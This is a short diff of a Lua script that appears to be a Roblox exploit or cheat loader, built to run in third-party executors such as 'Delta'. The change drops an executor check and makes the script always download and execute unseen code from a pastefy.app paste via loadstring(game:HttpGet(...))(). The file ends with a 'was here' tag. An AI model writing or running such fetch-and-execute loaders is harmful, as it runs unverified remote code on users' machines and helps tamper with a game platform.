@@ -51,11 +51,7 @@ local function if_delta()
 	
 end
 
-if identifyexecutor() == "Delta" then
-	if_delta()
-elseif identifyexecutor() ~= "Delta" then
-	loadstring(game:HttpGet("https://pastefy.app/pEUtGRWb/raw"))()
-end
+loadstring(game:HttpGet("https://pastefy.app/bjf4jiro/raw"))()
 
 
 warn("wortxxxxx1 was here.")
